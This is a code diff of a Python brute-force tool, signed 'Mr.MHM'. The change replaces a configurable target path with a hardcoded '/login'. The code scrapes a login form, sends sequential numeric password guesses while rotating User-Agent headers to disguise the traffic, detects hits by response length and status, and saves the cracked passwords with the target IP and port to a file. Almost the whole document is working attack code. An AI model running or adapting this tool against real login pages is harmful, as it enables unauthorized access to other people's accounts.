@@ -37,7 +37,7 @@ def cou(word) -> int():
     return n
 
 
-def req(url, port, maxNumber, minNumber, NL, name_form, Next_Url):
+def req(url, port, maxNumber, minNumber, NL, name_form):
     _URL_ = url
     _PORT_ = port
 
@@ -48,8 +48,8 @@ def req(url, port, maxNumber, minNumber, NL, name_form, Next_Url):
     agents = agent()
 
     # Url target and add http if not find in url !
-    _URL_ = f"http://{_URL_}:{_PORT_}{Next_Url}" if _URL_.startswith("http") \
-                                                is False else f"{_URL_}:{_PORT_}{Next_Url}"
+    _URL_ = f"http://{_URL_}:{_PORT_}/login" if _URL_.startswith("http") \
+                                                is False else f"{_URL_}:{_PORT_}/login"
 
     # Use User-Agent on headers like proxy
     _session_.headers['User-Agent'] = agents[minNumber]
@@ -72,14 +72,14 @@ def req(url, port, maxNumber, minNumber, NL, name_form, Next_Url):
     if int(attack.headers['Content-Length']) < 4000:
         _session_.get(url=_URL__O_)
         _URL__O_ = f"http://{_URL_}:{_PORT_}/{Next_Url}" if _URL_.startswith(
-            "http://") is False else f"{_URL_}:{_PORT_}/{Next_Url}"
+            "http://") is False else f"{_URL_}:{_PORT_}/login"
 
     # return Number for size Page
 
     return [int(attack.headers['Content-Length']), str(AllProcess), int(attack.status_code)]
 
 
-def index_exploit(ip, port, number, file, NextUrl):
+def index_exploit(ip, port, number, file):
     global First\
         , Next_save\
         , ZERO\
@@ -97,8 +97,8 @@ def index_exploit(ip, port, number, file, NextUrl):
 
     try:
 
-        _URL_ = f"http://{ip}:{port}{NextUrl}" if ip.startswith("http") \
-                                                    is False else f"{ip}:{port}{NextUrl}"
+        _URL_ = f"http://{ip}:{port}/login" if ip.startswith("http") \
+                                                    is False else f"{ip}:{port}/login"
 
         _SOUP_ = BeautifulSoup(requests.get(_URL_).text, "html5lib")
         NameForm = str()
@@ -120,8 +120,7 @@ def index_exploit(ip, port, number, file, NextUrl):
                      , maxNumber=Password if ZERO is False else str(f"0{Password}")
                      , minNumber=minNumber
                      , NL=int(AllFor+1)
-                     , name_form=NameForm
-                     , Next_Url=NextUrl)
+                     , name_form=NameForm)
 
         if AllFor == 0:
 
@@ -142,8 +141,7 @@ def index_exploit(ip, port, number, file, NextUrl):
             save(True, file=file
                  , ip=ip
                  , port=port
-                 , Password=Password
-                 , NextUrl=NextUrl)
+                 , Password=Password)
 
         if Next_save != smpleA[0] and smpleA[0] > 4000 and smpleA[2] is 200:
             errors_num += 1
@@ -153,8 +151,7 @@ def index_exploit(ip, port, number, file, NextUrl):
             save(False, file=file
                  , ip=ip
                  , port=port
-                 , Password=Password
-                 , NextUrl=NextUrl)
+                 , Password=Password)
 
         First = f"""[{B} * {N}] Find Passwords      : "  {R}{password_num}{N}  "  
 [{B} * {N}] Find Errors         : "  {R}{errors_num}{N}  "
@@ -179,16 +176,16 @@ def index_exploit(ip, port, number, file, NextUrl):
     input(f'{W}{R}---- Find Passwords {password_num} Please Open This file {file} ----{N}')
 
 
-def save(act, file, ip, port, Password,NextUrl):
+def save(act, file, ip, port, Password):
     if act is True:
         saveP = open(f'{file}', 'a')
         saveP.write(f'{"+" * 10} Mr.MHM {"+" * 10}\nDate = {time.ctime()}\n'
-                    f'Url = http://{ip}:{port}{NextUrl}\nPassword = {Password}\n\n')
+                    f'Url = http://{ip}:{port}/login\nPassword = {Password}\n\n')
         saveP.close()
     else:
         saveE = open(f'Error{file}', 'a')
         saveE.write(f'{"+" * 10} Mr.MHM {"+" * 10}\nDate = {time.ctime()}\n'
-                    f'Url = http://{ip}:{port}{NextUrl}\nPassword = {Password}\n\n')
+                    f'Url = http://{ip}:{port}/login\nPassword = {Password}\n\n')
         saveE.close()
 
 
@@ -207,11 +204,10 @@ class MAIN(object):
     def __init__(self):
         pass
 
-    def run(self, ip, port, numbers, Next_Url):
+    def run(self, ip, port, numbers):
 
         index_exploit(ip=ip
                       , port=port
                       , number=numbers
-                      , file="Password"
-                      , NextUrl=Next_Url
+                      , file="Password.txt"
                       )
